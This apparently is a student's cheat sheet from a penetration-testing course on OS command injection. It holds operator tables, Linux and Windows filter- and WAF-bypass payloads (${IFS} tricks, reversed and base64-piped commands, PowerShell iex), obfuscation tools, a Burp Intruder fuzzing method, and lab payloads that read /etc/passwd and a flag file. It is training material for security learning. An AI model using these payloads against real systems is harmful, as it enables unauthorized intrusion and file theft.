# Command Injections

> Status: ✅ Complete (reference)
> Date started: 2026-10-26
> Date finished: 2026-10-27
## 1. Goal
Inject OS commands where an app passes user input into a system call. Find an input that reaches a shell, chain a command with an operator, bypass filters as needed.

## Injection operators (chain your command)
| Operator | URL-enc | Effect |
|---|---|---|
| `;` | %3b | run both (Linux; also cmd) |
| `\n` | %0a | run both |
| `&` | %26 | run both (background) |
| `\|` | %7c | pipe; shows 2nd output |
| `&&` | %26%26 | run 2nd if 1st succeeds |
| `\|\|` | %7c%7c | run 2nd if 1st fails |
| `` `cmd` `` / `$(cmd)` | %60 / %24%28%29 | sub-shell (Linux) |

Test with a benign cmd: `127.0.0.1; id` or `127.0.0.1 && whoami`.

## Filter bypasses — Linux
```bash
# spaces blocked:
cat${IFS}/etc/passwd      # ${IFS}
{cat,/etc/passwd}         # brace-comma
cat%09/etc/passwd         # tab
# slash/semicolon from env:
${PATH:0:1}               # -> /
${LS_COLORS:10:1}         # -> ;
# blacklisted chars: insert quotes (even number) or \ / $@
w'h'o'am'i  ;  who$@ami
# case:  $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
# reversed:  eval $(rev<<<'imaohw')
# base64:  bash<<<$(base64 -d<<<Y2F0...)
```

## Filter bypasses — Windows
```powershell
# spaces:  cmd  %PROGRAMFILES:~10,-5%   |  PS  $env:PROGRAMFILES[10]
# chars from env:  %HOMEPATH:~0,-17%  (-> \)  |  $env:HOMEPATH[0]
# insert: ' or " (even count) ; ^ escape char (cmd)
# case:  WhoAmi  (odd case beats naive blacklists)
# reversed (PS):  iex "$('imaohw'[-1..-20] -join '')"
# base64 (PS, UTF-16LE):
#   [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('whoami'))
#   iex "$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('<b64>')))"
```

## Automated obfuscation & finding what gets through
```bash
./bashfuscator -c 'cat /etc/passwd'                      # Linux: auto-obfuscate a command
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1   # simpler, more reliable output
# Windows (PowerShell): Invoke-DOSfuscation — Import-Module, SET COMMAND <cmd>, encoding
```
**Finding the working combo through a WAF (Burp Intruder, cluster bomb):** two payload positions —
- Position 1 = separator list (`;`, `%0a`, `&`, `|`, `&&`, `||`, `` `` ``, `$()`) — **do NOT URL-encode**
- Position 2 = obfuscated command list (`uname`, `u'n'a'm'e`, `$(rev<<<'emanu')`, `bash<<<$(base64 -d<<<...)`) — **URL-encode this one**

The combos that don't return the WAF's block message (e.g. "Malicious request denied") are the ones that got through. Often a sub-shell separator like `%26$()` + a quote-obfuscated command is what lands.

## Approach & fix
1. Find input reaching a command (filenames, ping/host fields, converters).
2. Inject an operator + benign cmd (`id`/`whoami`) to confirm.
3. Hit a filter → bypass spaces, then blacklisted chars, then whole-command (case/reverse/base64).
4. Escalate to a shell once confirmed (payload not stored here).

**Fix:** never pass user input to a shell; use language APIs/parameterized calls; strict allow-list input validation; least privilege.

> Workflow: confirm with `id` first, then escalate filter bypasses in order (spaces → chars → encoding). Base64-piping-to-bash defeats most naive filters in one shot.

## Full reference (source notes)
Complete operator / separator / bypass / obfuscation set — nothing trimmed.

**Injection operators**
| Operator | Char | URL-encoded | Executes |
|---|---|---|---|
| Semicolon | `;` | `%3b` | Both |
| New line | `\n` | `%0a` | Both |
| Background | `&` | `%26` | Both (2nd output usually first) |
| Pipe | `\|` | `%7c` | Both (only 2nd output shown) |
| AND | `&&` | `%26%26` | Both (only if 1st succeeds) |
| OR | `\|\|` | `%7c%7c` | 2nd only if 1st fails |
| Sub-shell | `` `` `` | `%60%60` | Both (Linux only) |
| Sub-shell | `$()` | `%24%28%29` | Both (Linux only) |

**Separator wordlist** (for fuzzing): `; %3b \n %0a & %26 | %7c && %26%26 || %7c%7c `` %60%60 $() %24%28%29`

**Obfuscated-command wordlist** (WAF-bypass test): `uname` · `u'n'a'm'e` · `${uname}` · `$(uname)` · `{uname}` · `$(rev<<<'emanu')` · `bash<<<$(base64 -d<<<dW5hbWUgLWE=)` · `b'a's'h'<<<$('b'a's'e'6'4 -d<<<dW5hbWUgLWE=)` · `l's'${IFS}${PATH:0:1}${IFS}-a'l'`

**Linux — filtered character bypass**
| Code | Description |
|---|---|
| `printenv` | View all environment variables |
| `%09` | Tab instead of space |
| `${IFS}` | Expands to space/tab (not inside `$()`) |
| `{ls,-la}` | Commas become spaces |
| `${PATH:0:1}` | → `/` |
| `${LS_COLORS:10:1}` | → `;` |
| `$(tr '!-}' '"-~'<<<[)` | Shift char by one → `\` |
| `$(tr '!-}' '"-~'<<<:)` | Shift char by one → `;` |

**Linux — blacklisted command bypass**
| Code | Description |
|---|---|
| `'` or `"` (even count) | Character insertion |
| `$@` or `\` | Insertion (Linux only) |
| `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` | Case manipulation |
| `$(a="WhOaMi";printf %s "${a,,}")` | Case manipulation (variant) |
| `echo 'whoami' \| rev` → `$(rev<<<'imaohw')` | Reverse then execute |
| `echo -n 'cat /etc/passwd \| grep 33' \| base64` → `bash<<<$(base64 -d<<<Y2F0...)` | Base64 encode then execute |

**Linux — space-filter bypass** (prefix `127.0.0.1%0a`): `%0a whoami` · `%0a%09` (tab) · `%0a${IFS}` · `%0a{ls,-la}` · `%0als${IFS}${PATH:0:1}home`

**Windows — filtered character bypass**
| Code | Description |
|---|---|
| `Get-ChildItem Env:` | View env variables (PowerShell) |
| `%09` | Tab instead of space |
| `%PROGRAMFILES:~10,-5%` | → space (CMD) |
| `$env:PROGRAMFILES[10]` | → space (PowerShell) |
| `%HOMEPATH:~0,-17%` | → `\` (CMD) |
| `$env:HOMEPATH[0]` | → `\` (PowerShell) |
| `echo %HOMEPATH:~6,-11%` | Produce `/`-like slash (CMD) |

**Windows — blacklisted command bypass**
| Code | Description |
|---|---|
| `'` or `"` (even count) | Character insertion |
| `^` | Insertion (CMD only) |
| `WhoAmi` | Odd-case beats naive blacklists |
| `"whoami"[-1..-20] -join ''` | Reverse a string (PS) |
| `iex "$('imaohw'[-1..-20] -join '')"` | Execute reversed (PS) |
| `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))` | Base64 encode (PS, UTF-16LE) |
| `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` | Execute b64 (PS) |

**Automated obfuscation**
| Command | Description |
|---|---|
| `./bashfuscator -c 'cat /etc/passwd'` | Auto-obfuscate (Linux) |
| `./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1` | Simpler, reliable output |
| Invoke-DOSfuscation (`Import-Module`, `SET COMMAND <cmd>`, `encoding`) | Windows CMD obfuscation |

**Example WAF-bypass payloads** (from the skills assessment)
| Payload | Description |
|---|---|
| `ip=127.0.0.1%0al's'${IFS}-al${IFS}${PATH:0:1}home` | List /home through filters |
| `ip=127.0.0.1%0ac'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt` | Read a file through filters |
| `ip=127.0.0.1%0a$(rev<<<'hsab')<<<$($(rev<<<'46esab')${IFS}-d<<<<b64>)` | Reversed bash + base64 chain |
| `?to=tmp%26$()l's'${IFS}${PATH:0:1}${IFS}-a'l'` | Sub-shell separator + obfuscated `ls` |

> Note the Burp Intruder method (above) for finding which separator+command combo gets past the WAF: Payload 1 = separators (not URL-encoded), Payload 2 = obfuscated commands (URL-encoded), cluster bomb.
